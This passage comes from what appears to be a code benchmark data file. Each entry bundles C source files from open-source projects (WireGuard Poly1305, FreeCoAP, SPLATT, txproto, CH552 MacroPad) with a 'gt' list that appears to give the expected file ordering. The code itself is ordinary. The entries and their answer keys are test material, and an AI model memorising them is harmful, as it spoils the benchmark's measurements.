false;\n#endif\n}\n\n#endif\n\n'wireguard-linux-compat/src/compat/fpu-x86/include/asm/fpu/api.h'\n:#include <asm/i387.h>\n\n'wireguard-linux-compat/src/crypto/zinc/poly1305/poly1305.c'\n:\n\n\n#include <zinc/poly1305.h>\n#include \"../selftest/run.h\"\n\n#include <asm/unaligned.h>\n#include <linux/kernel.h>\n#include <linux/string.h>\n#include <linux/module.h>\n#include <linux/init.h>\n\n#if defined(CONFIG_ZINC_ARCH_X86_64)\n#include \"poly1305-x86_64-glue.c\"\n#elif defined(CONFIG_ZINC_ARCH_ARM) || defined(CONFIG_ZINC_ARCH_ARM64)\n#include \"poly1305-arm-glue.c\"\n#elif defined(CONFIG_ZINC_ARCH_MIPS) || defined(CONFIG_ZINC_ARCH_MIPS64)\n#include \"poly1305-mips-glue.c\"\n#else\nstatic inline bool poly1305_init_arch(void *ctx,\n\t\t\t\t      const u8 key[POLY1305_KEY_SIZE])\n{\n\treturn false;\n}\nstatic inline bool poly1305_blocks_arch(void *ctx, const u8 *input,\n\t\t\t\t\tsize_t len, const u32 padbit,\n\t\t\t\t\tsimd_context_t *simd_context)\n{\n\treturn false;\n}\nstatic inline bool poly1305_emit_arch(void *ctx, u8 mac[POLY1305_MAC_SIZE],\n\t\t\t\t      const u32 nonce[4],\n\t\t\t\t      simd_context_t *simd_context)\n{\n\treturn false;\n}\nstatic bool *const poly1305_nobs[] __initconst = { };\nstatic void __init poly1305_fpu_init(void)\n{\n}\n#endif\n\n#if defined(CONFIG_ARCH_SUPPORTS_INT128) && defined(__SIZEOF_INT128__)\n#include \"poly1305-donna64.c\"\n#else\n#include \"poly1305-donna32.c\"\n#endif\n\nvoid poly1305_init(struct poly1305_ctx *ctx, const u8 key[POLY1305_KEY_SIZE])\n{\n\tctx->nonce[0] = get_unaligned_le32(&key[16]);\n\tctx->nonce[1] = get_unaligned_le32(&key[20]);\n\tctx->nonce[2] = get_unaligned_le32(&key[24]);\n\tctx->nonce[3] = get_unaligned_le32(&key[28]);\n\n\tif (!poly1305_init_arch(ctx->opaque, key))\n\t\tpoly1305_init_generic(ctx->opaque, key);\n\n\tctx->num = 0;\n}\n\nstatic inline void poly1305_blocks(void *ctx, const u8 *input, const size_t len,\n\t\t\t\t   const u32 padbit,\n\t\t\t\t   simd_context_t *simd_context)\n{\n\tif (!poly1305_blocks_arch(ctx, input, len, padbit, simd_context))\n\t\tpoly1305_blocks_generic(ctx, input, len, padbit);\n}\n\nstatic inline void poly1305_emit(void *ctx, u8 mac[POLY1305_KEY_SIZE],\n\t\t\t\t const u32 nonce[4],\n\t\t\t\t simd_context_t *simd_context)\n{\n\tif (!poly1305_emit_arch(ctx, mac, nonce, simd_context))\n\t\tpoly1305_emit_generic(ctx, mac, nonce);\n}\n\nvoid poly1305_update(struct poly1305_ctx *ctx, const u8 *input, size_t len,\n\t\t     simd_context_t *simd_context)\n{\n\tconst size_t num = ctx->num;\n\tsize_t rem;\n\n\tif (num) {\n\t\trem = POLY1305_BLOCK_SIZE - num;\n\t\tif (len < rem) {\n\t\t\tmemcpy(ctx->data + num, input, len);\n\t\t\tctx->num = num + len;\n\t\t\treturn;\n\t\t}\n\t\tmemcpy(ctx->data + num, input, rem);\n\t\tpoly1305_blocks(ctx->opaque, ctx->data, POLY1305_BLOCK_SIZE, 1,\n\t\t\t\tsimd_context);\n\t\tinput += rem;\n\t\tlen -= rem;\n\t}\n\n\trem = len % POLY1305_BLOCK_SIZE;\n\tlen -= rem;\n\n\tif (len >= POLY1305_BLOCK_SIZE) {\n\t\tpoly1305_blocks(ctx->opaque, input, len, 1, simd_context);\n\t\tinput += len;\n\t}\n\n\tif (rem)\n\t\tmemcpy(ctx->data, input, rem);\n\n\tctx->num = rem;\n}\n\nvoid poly1305_final(struct poly1305_ctx *ctx, u8 mac[POLY1305_MAC_SIZE],\n\t\t    simd_context_t *simd_context)\n{\n\tsize_t num = ctx->num;\n\n\tif (num) {\n\t\tctx->data[num++] = 1;\n\t\twhile (num < POLY1305_BLOCK_SIZE)\n\t\t\tctx->data[num++] = 0;\n\t\tpoly1305_blocks(ctx->opaque, ctx->data, POLY1305_BLOCK_SIZE, 0,\n\t\t\t\tsimd_context);\n\t}\n\n\tpoly1305_emit(ctx->opaque, mac, ctx->nonce, simd_context);\n\n\tmemzero_explicit(ctx, sizeof(*ctx));\n}\n\n#include \"../selftest/poly1305.c\"\n\nstatic bool nosimd __initdata = false;\n\n#ifndef COMPAT_ZINC_IS_A_MODULE\nint __init poly1305_mod_init(void)\n#else\nstatic int __init mod_init(void)\n#endif\n{\n\tif (!nosimd)\n\t\tpoly1305_fpu_init();\n\tif (!selftest_run(\"poly1305\", poly1305_selftest, poly1305_nobs,\n\t\t\t  ARRAY_SIZE(poly1305_nobs)))\n\t\treturn -ENOTRECOVERABLE;\n\treturn 0;\n}\n\n#ifdef COMPAT_ZINC_IS_A_MODULE\nstatic void __exit mod_exit(void)\n{\n}\n\nmodule_param(nosimd, bool, 0);\nmodule_init(mod_init);\nmodule_exit(mod_exit);\nMODULE_LICENSE(\"GPL v2\");\nMODULE_DESCRIPTION(\"Poly1305 one-time authenticator\");\nMODULE_AUTHOR(\"Jason A. Donenfeld <Jason@zx2c4.com>\");\n#endif\n",
        "gt": [
            "'wireguard-linux-compat/src/compat/fpu-x86/include/asm/fpu/api.h'",
            "'wireguard-linux-compat/src/compat/simd-asm/include/asm/simd.h'",
            "'wireguard-linux-compat/src/compat/simd/include/linux/simd.h'",
            "'wireguard-linux-compat/src/crypto/include/zinc/poly1305.h'",
            "'wireguard-linux-compat/src/crypto/zinc/poly1305/poly1305.c'"
        ]
    },
    {
        "files": [
            "'FreeCoAP/lib/include/coap_ipv.h'",
            "'FreeCoAP/sample/reg_server/registrar.h'",
            "'FreeCoAP/sample/reg_server/registrar.c'"
        ],
        "content": "'FreeCoAP/lib/include/coap_ipv.h'\n:\n\n\n\n#ifndef COAP_IPV_H\n#define COAP_IPV_H\n\n#include <netinet/in.h>\n\n#ifdef COAP_IP6\n\n#define COAP_IPV_AF_INET          AF_INET6\n#define COAP_IPV_INET_ADDRSTRLEN  INET6_ADDRSTRLEN\n#define COAP_IPV_SIN_ADDR         sin6_addr\n#define COAP_IPV_SIN_PORT         sin6_port\n\ntypedef struct sockaddr_in6  coap_ipv_sockaddr_in_t;\n\n#else\n\n#define COAP_IPV_AF_INET          AF_INET\n#define COAP_IPV_INET_ADDRSTRLEN  INET_ADDRSTRLEN\n#define COAP_IPV_SIN_ADDR         sin_addr\n#define COAP_IPV_SIN_PORT         sin_port\n\ntypedef struct sockaddr_in   coap_ipv_sockaddr_in_t;\n\n#endif\n\n#endif\n\n'FreeCoAP/sample/reg_server/registrar.h'\n:\n\n#ifndef REGISTRAR_H\n#define REGISTRAR_H\n\n#include <arpa/inet.h>\n#include \"coap_ipv.h\"\n\n#define REGISTRAR_ID_MAX_BUF_LEN  32\n\n#define registrar_entry_get_id(entry)            ((entry)->id)\n#define registrar_entry_get_addr(entry)          ((entry)->addr)\n#define registrar_entry_get_prev(entry)          ((entry)->prev)\n#define registrar_entry_set_prev(entry, pentry)  ((entry)->prev = (pentry))\n#define registrar_entry_get_next(entry)          ((entry)->next)\n#define registrar_entry_set_next(entry, nentry)  ((entry)->next = (nentry))\n\n#define registrar_get_first(registrar)           ((registrar)->first)\n#define registrar_get_last(registrar)            ((registrar)->last)\n\ntypedef struct registrar_entry\n{\n    char id[REGISTRAR_ID_MAX_BUF_LEN];\n    char addr[COAP_IPV_INET_ADDRSTRLEN];\n    struct registrar_entry *prev;\n    struct registrar_entry *next;\n}\nregistrar_entry_t;\n\ntypedef struct\n{\n    registrar_entry_t *first;\n    registrar_entry_t *last;\n}\nregistrar_t;\n\nregistrar_entry_t *registrar_entry_new(const char *id, const char *addr);\nvoid registrar_entry_delete(registrar_entry_t *entry);\n\nvoid registrar_create(registrar_t *registrar);\nvoid registrar_destroy(registrar_t *registrar);\nregistrar_entry_t *registrar_find(registrar_t *registrar, const char *id);\nint registrar_add(registrar_t *registrar, const char *id, const char *addr);\nint registrar_del(registrar_t *registrar, const char *id);\n\n#endif\n\n'FreeCoAP/sample/reg_server/registrar.c'\n:\n\n#include <stdlib.h>\n#include <string.h>\n#include <errno.h>\n#include \"registrar.h\"\n\nregistrar_entry_t *registrar_entry_new(const char *id, const char *addr)\n{\n    registrar_entry_t *entry = NULL;\n\n    entry = (registrar_entry_t *)malloc(sizeof(registrar_entry_t));\n    if (entry == NULL)\n    {\n        return NULL;\n    }\n    strncpy(entry->id, id, sizeof(entry->id));\n    entry->id[sizeof(entry->id) - 1] = '\\0';\n    strncpy(entry->addr, addr, sizeof(entry->addr));\n    entry->addr[sizeof(entry->addr) - 1] = '\\0';\n    entry->prev = NULL;\n    entry->next = NULL;\n    return entry;\n}\n\nvoid registrar_entry_delete(registrar_entry_t *entry)\n{\n    free(entry);\n}\n\nvoid registrar_create(registrar_t *registrar)\n{\n    memset(registrar, 0, sizeof(registrar_t));\n}\n\nstatic void registrar_entry_set_addr(registrar_entry_t *entry, const char *addr)\n{\n    strncpy(entry->addr, addr, sizeof(entry->addr));\n    entry->addr[sizeof(entry->addr) - 1] = '\\0';\n}\n\nvoid registrar_destroy(registrar_t *registrar)\n{\n    registrar_entry_t *entry = NULL;\n    registrar_entry_t *prev = NULL;\n\n    entry = registrar->first;\n    while (entry != NULL)\n    {\n        prev = entry;\n        entry = registrar_entry_get_next(entry);\n        registrar_entry_delete(prev);\n    }\n    memset(registrar, 0, sizeof(registrar_t));\n}\n\nregistrar_entry_t *registrar_find(registrar_t *registrar, const char *id)\n{\n    registrar_entry_t *entry = NULL;\n\n    entry = registrar->first;\n    while (entry != NULL)\n    {\n        if (strcmp(entry->id, id) == 0)\n        {\n            return entry;\n        }\n        entry = registrar_entry_get_next(entry);\n    }\n    return NULL;\n}\n\nint registrar_add(registrar_t *registrar, const char *id, const char *addr)\n{\n    registrar_entry_t *entry = NULL;\n\n    entry = registrar_find(registrar, id);\n    if (entry != NULL)\n    {\n\n        registrar_entry_set_addr(entry, addr);\n        return 1;\n    }\n    entry = registrar_entry_new(id, addr);\n    if (entry == NULL)\n    {\n        return -ENOMEM;\n    }\n    if ((registrar->first == NULL) && (registrar->last == NULL))\n    {\n        registrar->first = entry;\n        registrar->last = entry;\n    }\n    else\n    {\n        registrar_entry_set_prev(entry, registrar->last);\n        registrar_entry_set_next(registrar->last, entry);\n        registrar->last = entry;\n    }\n    return 0;\n}\n\nint registrar_del(registrar_t *registrar, const char *id)\n{\n    registrar_entry_t *entry = NULL;\n\n    entry = registrar_find(registrar, id);\n    if (entry == NULL)\n    {\n        return -EINVAL;\n    }\n    if (registrar->first == entry)\n        registrar->first = registrar_entry_get_next(registrar->first);\n    if (registrar->last == entry)\n        registrar->last = registrar_entry_get_prev(registrar->last);\n    registrar_entry_delete(entry);\n    return 0;\n}\n",
        "gt": [
            "'FreeCoAP/lib/include/coap_ipv.h'",
            "'FreeCoAP/sample/reg_server/registrar.h'",
            "'FreeCoAP/sample/reg_server/registrar.c'"
        ]
    },
    {
        "files": [
            "'splatt/include/splatt/constants.h'",
            "'splatt/include/splatt.h'",
            "'splatt/matlab/splatt_mttkrp.c'"
        ],
        "content": "'splatt/include/splatt/constants.h'\n:\n\n\n\n#ifndef SPLATT_SPLATT_CONSTANTS_H\n#define SPLATT_SPLATT_CONSTANTS_H\n\n#ifndef SPLATT_MAX_NMODES\n#define SPLATT_MAX_NMODES ((splatt_idx_t) 8)\n#endif\n\nstatic double const SPLATT_VAL_OFF = -DBL_MAX;\n\n#endif\n\n'splatt/include/splatt.h'\n:\n\n\n\n#ifndef SPLATT_SPLATT_H\n#define SPLATT_SPLATT_H\n\n\n\n\n\n#ifdef SPLATT_USE_MPI\n#include <mpi.h>\n#endif\n\n\n\n\n\n\n\n#include \"splatt/types.h\"\n#include \"splatt/constants.h\"\n#include \"splatt/structs.h\"\n\n\n\n\n#include \"splatt/api_csf.h\"\n#include \"splatt/api_factorization.h\"\n#include \"splatt/api_kernels.h\"\n#include \"splatt/api_kruskal.h\"\n#include \"splatt/api_mpi.h\"\n#include \"splatt/api_options.h\"\n#include \"splatt/api_version.h\"\n\n#endif\n\n'splatt/matlab/splatt_mttkrp.c'\n:\n#include \"mex.h\"\n\n#include <stdint.h>\n#include <string.h>\n#include <splatt.h>\n\n#include \"splatt_shared.h\"\n\n\n\n\nvoid mexFunction(\n    int nlhs,\n    mxArray * plhs[],\n    int nrhs,\n    mxArray const * prhs[])\n{\n  splatt_idx_t m;\n  splatt_idx_t i,j;\n\n  if(nrhs < 3) {\n    mexErrMsgTxt(\"Missing arguments. See 'help splatt_mttkrp' for usage.\\n\");\n    return;\n  }\n\n  double * cpd_opts = splatt_default_opts();\n  if(nrhs > 1 && mxIsStruct(prhs[nrhs-1])) {\n    p_parse_opts(prhs[nrhs-1], cpd_opts);\n  }\n\n  mxArray const * matcells = prhs[1];\n\n  splatt_idx_t nmodes;\n  splatt_csf * tt = p_parse_tensor(nrhs, prhs, &nmodes, cpd_opts);\n\n  splatt_idx_t const mode = (splatt_idx_t) mxGetScalar(prhs[2]) - 1;\n\n  mwSize const * matdims = mxGetDimensions(mxGetCell(matcells, nmodes-1));\n  splatt_idx_t const nfactors = (splatt_idx_t) matdims[1];\n\n\n  splatt_val_t * mats[SPLATT_MAX_NMODES];\n  for(m=0; m < nmodes; ++m) {\n    splatt_idx_t const dim = tt[0].dims[m];\n    mats[m] = (splatt_val_t *) malloc(dim * nfactors * sizeof(splatt_val_t));\n\n\n    if(m == mode) {\n      continue;\n    }\n\n    mxArray const * const curr = mxGetCell(matcells, m);\n    double const * const matdata = (double *) mxGetPr(curr);\n\n    for(i=0; i < dim; ++i) {\n      for(j=0; j < nfactors; ++j) {\n        mats[m][j+(i*nfactors)] = (splatt_val_t) matdata[i + (j*dim)];\n      }\n    }\n  }\n\n\n  int ret = splatt_mttkrp(mode, nfactors, tt, mats, mats[mode], cpd_opts);\n  if(ret != SPLATT_SUCCESS) {\n    mexPrintf(\"splatt_mttkrp returned %d\\n\", ret);\n    goto CLEANUP;\n  }\n\n\n  splatt_idx_t const dim = tt[0].dims[mode];\n  mxArray * out = mxCreateDoubleMatrix(dim, nfactors, mxREAL);\n  double * const outpr = (double *) mxGetPr(out);\n  splatt_val_t const * const matpr = mats[mode];\n  for(j=0; j < nfactors; ++j) {\n    for(i=0; i < dim; ++i) {\n      outpr[i+(j * dim)] = (double) matpr[j + (i*nfactors)];\n    }\n  }\n\n  if(nlhs > 0) {\n    plhs[0] = out;\n  }\n\n\n  CLEANUP:\n  p_free_tensor(nrhs, prhs, tt, cpd_opts);\n  splatt_free_opts(cpd_opts);\n  for(m=0; m < nmodes; ++m) {\n    free(mats[m]);\n  }\n}\n",
        "gt": [
            "'splatt/include/splatt/constants.h'",
            "'splatt/include/splatt.h'",
            "'splatt/matlab/splatt_mttkrp.c'"
        ]
    },
    {
        "files": [
            "'txproto/src/io.c'",
            "'txproto/src/include/libtxproto/io.h'",
            "'txproto/src/include/libtxproto/fifo_frame.h'"
        ],
        "content": "'txproto/src/io.c'\n:#include <libavutil/buffer.h>\n\n#include <libtxproto/txproto_main.h>\n#include <libtxproto/io.h>\n\n#include \"iosys_common.h\"\n\nAVBufferRef *sp_io_alloc(TXMainContext *ctx,\n                         const char **api_list,\n                         event_fn source_event_cb,\n                         event_free source_event_free,\n                         size_t callback_ctx_size)\n{\n    int err = 0;\n\n    for (int i = 0; (api_list && api_list[i]); i++) {\n        int j;\n        for (j = 0; j < sp_compiled_apis_len; j++)\n            if (!strcmp(api_list[i], sp_compiled_apis[j]->name))\n                break;\n        if (j == sp_compiled_apis_len) {\n            char temp[99] = { 0 };\n            snprintf(temp, sizeof(temp), \"%s\", api_list[i]);\n            sp_log(ctx, SP_LOG_ERROR, \"API \\\"%s\\\" not found!\", temp);\n            return NULL;\n        }\n    }\n\n    if (!ctx->io_api_ctx)\n        ctx->io_api_ctx = av_mallocz(sizeof(*ctx->io_api_ctx)*sp_compiled_apis_len);\n\n\n    int initialized_apis = 0, apis_initialized = 0;\n    for (int i = 0; i < sp_compiled_apis_len; i++) {\n        if (ctx->io_api_ctx[i]) {\n            initialized_apis++;\n            continue;\n        }\n        int found = 0;\n        for (int j = 0; (api_list && api_list[j]); j++) {\n            if (!strcmp(api_list[j], sp_compiled_apis[i]->name)) {\n                found = 1;\n                break;\n            }\n        }\n        if (api_list && !found)\n            continue;\n\n        err = sp_compiled_apis[i]->init_sys(&ctx->io_api_ctx[i]);\n        if (!api_list && err == AVERROR(ENOSYS)) {\n            continue;\n        } else if (err < 0) {\n            sp_log(ctx, SP_LOG_ERROR, \"Unable to load API \\\"%s\\\": %s!\",\n                   sp_compiled_apis[i]->name, av_err2str(err));\n            return NULL;\n        }\n\n        initialized_apis++;\n        apis_initialized++;\n    }\n\n    if (!initialized_apis) {\n        if (api_list)\n            sp_log(ctx, SP_LOG_ERROR, \"No requested I/O API(s) available of the %d enabled at build time.\\n\",\n                   sp_compiled_apis_len);\n        else\n            sp_log(ctx, SP_LOG_WARN, \"No I/O APIs available.\\n\");\n\n        return NULL;\n    } else if (apis_initialized) {\n        sp_log(ctx, SP_LOG_DEBUG, \"%i I/O(s) initialized.\\n\", apis_initialized);\n    }\n\n\n    SPEventType type = SP_EVENT_TYPE_SOURCE    | SP_EVENT_ON_CHANGE |\n                       SP_EVENT_FLAG_IMMEDIATE | SP_EVENT_FLAG_UNIQUE;\n\n    return sp_event_create(source_event_cb,\n                           source_event_free,\n                           callback_ctx_size,\n                           NULL,\n                           type,\n                           ctx,\n                           NULL);\n}\n\nint sp_io_init(TXMainContext *ctx,\n               AVBufferRef *source_event,\n               const char **api_list)\n{\n    int err;\n\n\n    for (int i = 0; i < sp_compiled_apis_len; i++) {\n        if (!ctx->io_api_ctx[i])\n            continue;\n        int found = 0;\n        for (int j = 0; (api_list && api_list[j]); j++) {\n            if (!strcmp(api_list[j], sp_compiled_apis[i]->name)) {\n                found = 1;\n                break;\n            }\n        }\n        if (api_list && !found)\n            continue;\n\n\n        err = sp_compiled_apis[i]->ctrl(ctx->io_api_ctx[i],\n                                        SP_EVENT_CTRL_NEW_EVENT | SP_EVENT_FLAG_IMMEDIATE,\n                                        source_event);\n        if (err < 0) {\n            sp_log(ctx, SP_LOG_ERROR, \"Unable to add event to API \\\"%s\\\": %s!\",\n                   sp_compiled_apis[i]->name, av_err2str(err));\n            return err;\n        }\n    }\n\n    sp_bufferlist_append_noref(ctx->ext_buf_refs, source_event);\n\n    return 0;\n}\n\nAVBufferRef *sp_io_create(TXMainContext *ctx,\n                          uint32_t identifier,\n                          AVDictionary *opts)\n{\n    int i = 0;\n    AVBufferRef *entry = NULL;\n    for (; i < sp_compiled_apis_len; i++)\n        if (ctx->io_api_ctx[i] &&\n            (entry = sp_compiled_apis[i]->ref_entry(ctx->io_api_ctx[i], identifier)))\n            break;\n\n    if (!entry) {\n        sp_log(ctx, SP_LOG_ERROR, \"Entry 0x%X not found!\", identifier);\n        return NULL;\n    }\n\n    int err = sp_compiled_apis[i]->init_io(ctx->io_api_ctx[i], entry, opts);\n    if (err < 0) {\n        sp_log(ctx, SP_LOG_ERROR, \"Unable to init IO: %s!\", av_err2str(err));\n        av_buffer_unref(&entry);\n        return NULL;\n    }\n\n    sp_bufferlist_append_noref(ctx->ext_buf_refs, entry);\n\n    return entry;\n}\n\n'txproto/src/include/libtxproto/io.h'\n:\n\n#pragma once\n\n#include <libavutil/buffer.h>\n#include <libavutil/rational.h>\n\n#include <libtxproto/events.h>\n#include <libtxproto/fifo_frame.h>\n#include <libtxproto/log.h>\n\nenum IOType {\n    SP_IO_TYPE_NONE = 0,\n\n    SP_IO_TYPE_VIDEO_DISPLAY = 1,\n\n    SP_IO_TYPE_AUDIO_MICROPHONE = 2,\n    SP_IO_TYPE_AUDIO_MONITOR = 3,\n    SP_IO_TYPE_AUDIO_OUTPUT = 4,\n};\n\ntypedef const struct IOSysAPI IOSysAPI;\n\ntypedef struct IOSysEntry {\n    SPClass *class;\n\n    char *desc;\n    enum IOType type;\n\n    uint32_t identifier;\n    uint32_t api_id;\n    int is_default;\n\n    IOSysAPI *api;\n    AVBufferRef *api_ctx;\n\n\n    int scale;\n    int x;\n    int y;\n    int width;\n    int height;\n    SPRotation rotation;\n    AVRational framerate;\n\n\n    int sample_rate;\n    int sample_fmt;\n    int channels;\n    AVChannelLayout ch_layout;\n    float volume;\n\n\n    AVBufferRef *frames;\n\n\n    int (*ctrl)(AVBufferRef *entry, SPEventType ctrl, void *arg);\n    SPBufferList *events;\n\n\n    void *api_priv;\n    void *io_priv;\n} IOSysEntry;\n\nconst char *sp_iosys_entry_type_string(enum IOType type);\n\nAVBufferRef *sp_io_alloc(TXMainContext *ctx,\n                         const char **api_list,\n                         event_fn source_event_cb,\n                         event_free source_event_free,\n                         size_t callback_ctx_size);\n\nint sp_io_init(TXMainContext *ctx,\n               AVBufferRef *source_event,\n               const char **api_list);\n\nAVBufferRef *sp_io_create(TXMainContext *ctx,\n                          uint32_t identifier,\n                          AVDictionary *opts);\n\n'txproto/src/include/libtxproto/fifo_frame.h'\n:\n\n#pragma once\n\n#include <assert.h>\n#include <libavutil/frame.h>\n\nenum SPFrameFIFOFlags {\n    FRAME_FIFO_BLOCK_MAX_OUTPUT = (1 << 0),\n    FRAME_FIFO_BLOCK_NO_INPUT   = (1 << 1),\n    FRAME_FIFO_PULL_NO_BLOCK    = (1 << 2),\n};\n\n#define FRENAME(x) FRAME_FIFO_ ## x\n#define RENAME(x)  sp_frame_ ##x\n#define FNAME      enum SPFrameFIFOFlags\n#define TYPE       AVFrame\n\n\nAVBufferRef *RENAME(fifo_create)(void *opaque, int max_queued, FNAME block_flags);\nAVBufferRef *RENAME(fifo_ref)(AVBufferRef *src, int max_queued, FNAME block_flags);\n\n\nint RENAME(fifo_is_full)(AVBufferRef *src);\nint RENAME(fifo_get_size)(AVBufferRef *src);\nint RENAME(fifo_get_max_size)(AVBufferRef *src);\n\n\nvoid RENAME(fifo_set_max_queued)(AVBufferRef *dst, int max_queued);\nvoid RENAME(fifo_set_block_flags)(AVBufferRef *dst, FNAME block_flags);\nint  RENAME(fifo_string_to_block_flags)(FNAME *dst, const char *in_str);\n\n\nint RENAME(fifo_mirror)(AVBufferRef *dst, AVBufferRef *src);\nint RENAME(fifo_unmirror)(AVBufferRef *dst, AVBufferRef *src);\nint RENAME(fifo_unmirror_all)(AVBufferRef *dst);\n\n\nint   RENAME(fifo_push)(AVBufferRef *dst, TYPE *in);\nTYPE *RENAME(fifo_pop)(AVBufferRef *src);\nint   RENAME(fifo_pop_flags)(AVBufferRef *src, TYPE **ret, FNAME flags);\nTYPE *RENAME(fifo_peek)(AVBufferRef *src);\n\n#undef TYPE\n#undef FNAME\n#undef RENAME\n#undef FRENAME\n\ntypedef enum SPRotation {\n    ROTATION_IDENTITY = 0,\n    ROTATION_ROTATE90,\n    ROTATION_ROTATE180,\n    ROTATION_ROTATE270,\n} SPRotation;\n\n\ntypedef struct FormatExtraData {\n    AVRational avg_frame_rate;\n    int bits_per_sample;\n    AVRational time_base;\n    SPRotation rotation;\n} FormatExtraData;\n",
        "gt": [
            "'txproto/src/include/libtxproto/fifo_frame.h'",
            "'txproto/src/include/libtxproto/io.h'",
            "'txproto/src/io.c'"
        ]
    },
    {
        "files": [
            "'CH552-MacroPad-plus/software/src/usb_hid.h'",
            "'CH552-MacroPad-plus/software/src/config.h'",
            "'CH552-MacroPad-plus/software/src/usb_handler.h'",
            "'CH552-MacroPad-plus/software/src/usb_descr.h'",
            "'CH552-MacroPad-plus/software/src/usb_hid.c'"
        ],
        "content": "'CH552-MacroPad-plus/software/src/usb_hid.h'\n:\n\n\n\n\n\n\n\n#pragma once\n\n#include <stdint.h>\n\n#include \"usb_handler.h\"\n\n\n\nvoid HID_init(void);\n\nvoid HID_sendReport(__xdata uint8_t* buf, uint8_t len);\n\n\n'CH552-MacroPad-plus/software/src/config.h'\n:\n\n\n\n#pragma once\n\n\n#define PIN_NEO             P16\n#define PIN_KEY1            P17\n#define PIN_KEY2            P31\n#define PIN_KEY3            P30\n#define PIN_KEY4            P15\n#define PIN_KEY5            P14\n#define PIN_KEY6            P32\n#define PIN_ENC_A           P34\n#define PIN_ENC_B           P33\n#define PIN_ENC_SW          P11\n\n\n#define NEO_COUNT           18\n#define NEO_GRB\n\n\n#define USB_VENDOR_ID       0x1189\n#define USB_PRODUCT_ID      0x8890\n#define USB_DEVICE_VERSION  0x0100\n\n\n#define USB_MAX_POWER_mA    150\n\n\n#define MANUFACTURER_STR    'w','a','g','i','m','i','n','a','t','o','r'\n#define PRODUCT_STR         'M','a','c','r','o','P','a','d'\n#define SERIAL_STR          'C','H','5','5','2','x','H','I','D'\n#define INTERFACE_STR       'H','I','D','-','K','e','y','b','o','a','r','d'\n\n'CH552-MacroPad-plus/software/src/usb_handler.h'\n:\n\n\n\n#pragma once\n#include <stdint.h>\n#include \"usb_descr.h\"\n\n\n\n\n__xdata __at (EP0_ADDR) uint8_t EP0_buffer[EP0_BUF_SIZE];\n__xdata __at (EP1_ADDR) uint8_t EP1_buffer[EP1_BUF_SIZE];\n__xdata __at (EP2_ADDR) uint8_t EP2_buffer[EP2_BUF_SIZE];\n\n#define USB_setupBuf ((PUSB_SETUP_REQ)EP0_buffer)\nextern uint8_t SetupReq;\n\n\n\n\nvoid HID_setup(void);\nvoid HID_reset(void);\nvoid HID_EP1_IN(void);\nvoid HID_EP2_OUT(void);\n\n\n\n\n\n#define USB_INIT_handler    HID_setup\n#define USB_RESET_handler   HID_reset\n\n\n#define EP0_SETUP_callback  USB_EP0_SETUP\n#define EP0_IN_callback     USB_EP0_IN\n#define EP0_OUT_callback    USB_EP0_OUT\n#define EP1_IN_callback     HID_EP1_IN\n#define EP2_OUT_callback    HID_EP2_OUT\n\n\n\n\nvoid USB_interrupt(void);\nvoid USB_init(void);\n\n'CH552-MacroPad-plus/software/src/usb_descr.h'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n#pragma once\n#include <stdint.h>\n#include \"usb.h\"\n#include \"config.h\"\n\n\n\n\n#define EP0_SIZE        8\n#define EP1_SIZE        8\n#define EP2_SIZE        8\n\n#define EP0_ADDR        0\n#define EP1_ADDR        (EP0_ADDR + EP0_BUF_SIZE)\n#define EP2_ADDR        (EP1_ADDR + EP1_BUF_SIZE)\n\n#define EP0_BUF_SIZE    EP_BUF_SIZE(EP0_SIZE)\n#define EP1_BUF_SIZE    EP_BUF_SIZE(EP1_SIZE)\n#define EP2_BUF_SIZE    EP_BUF_SIZE(EP2_SIZE)\n\n#define EP_BUF_SIZE(x)  (x+2<64 ? x+2 : 64)\n\n\n\n\ntypedef struct _USB_CFG_DESCR_HID {\n  USB_CFG_DESCR config;\n  USB_ITF_DESCR interface0;\n  USB_HID_DESCR hid0;\n  USB_ENDP_DESCR ep1IN;\n  USB_ENDP_DESCR ep2OUT;\n} USB_CFG_DESCR_HID, *PUSB_CFG_DESCR_HID;\ntypedef USB_CFG_DESCR_HID __xdata *PXUSB_CFG_DESCR_HID;\n\nextern __code USB_DEV_DESCR DevDescr;\nextern __code USB_CFG_DESCR_HID CfgDescr;\n\n\n\n\nextern __code uint8_t ReportDescr[];\nextern __code uint8_t ReportDescrLen;\n\n#define USB_REPORT_DESCR      ReportDescr\n#define USB_REPORT_DESCR_LEN  ReportDescrLen\n\n\n\n\nextern __code uint16_t LangDescr[];\nextern __code uint16_t ManufDescr[];\nextern __code uint16_t ProdDescr[];\nextern __code uint16_t SerDescr[];\nextern __code uint16_t InterfDescr[];\n\n#define USB_STR_DESCR_i0    (uint8_t*)LangDescr\n#define USB_STR_DESCR_i1    (uint8_t*)ManufDescr\n#define USB_STR_DESCR_i2    (uint8_t*)ProdDescr\n#define USB_STR_DESCR_i3    (uint8_t*)SerDescr\n#define USB_STR_DESCR_i4    (uint8_t*)InterfDescr\n#define USB_STR_DESCR_ix    (uint8_t*)SerDescr\n\n'CH552-MacroPad-plus/software/src/usb_hid.c'\n:\n\n\n\n\n\n\n\n#include \"ch554.h\"\n\n#include \"usb.h\"\n\n#include \"usb_hid.h\"\n\n#include \"usb_descr.h\"\n\n\n\n\n\n\n\n\n\n\n\nvolatile __bit HID_EP1_writeBusyFlag = 0;\n\n\n\n\n\n\n\n\n\n\n\n\n\nvoid HID_init(void) {\n\n  USB_init();\n\n  UEP1_T_LEN  = 0;\n\n}\n\n\n\n\n\nvoid HID_sendReport(__xdata uint8_t* buf, uint8_t len) {\n\n  uint8_t i;\n\n  while(HID_EP1_writeBusyFlag);\n\n  for(i=0; i<len; i++) EP1_buffer[i] = buf[i];\n\n  UEP1_T_LEN = len;\n\n  HID_EP1_writeBusyFlag = 1;\n\n  UEP1_CTRL = UEP1_CTRL & ~MASK_UEP_T_RES | UEP_T_RES_ACK;\n\n}\n\n\n\n\n\n\n\n\n\n\n\n\n\nvoid HID_setup(void) {\n\n  UEP1_DMA    = EP1_ADDR;\n\n  UEP2_DMA    = EP2_ADDR;\n\n  UEP1_CTRL   = bUEP_AUTO_TOG\n\n              | UEP_T_RES_NAK;\n\n  UEP2_CTRL   = bUEP_AUTO_TOG\n\n              | UEP_R_RES_ACK;\n\n  UEP4_1_MOD  = bUEP1_TX_EN;\n\n  UEP2_3_MOD  = bUEP2_RX_EN;\n\n}\n\n\n\n\n\nvoid HID_reset(void) {\n\n  UEP1_CTRL = bUEP_AUTO_TOG | UEP_T_RES_NAK;\n\n  UEP2_CTRL = bUEP_AUTO_TOG | UEP_R_RES_ACK;\n\n  HID_EP1_writeBusyFlag = 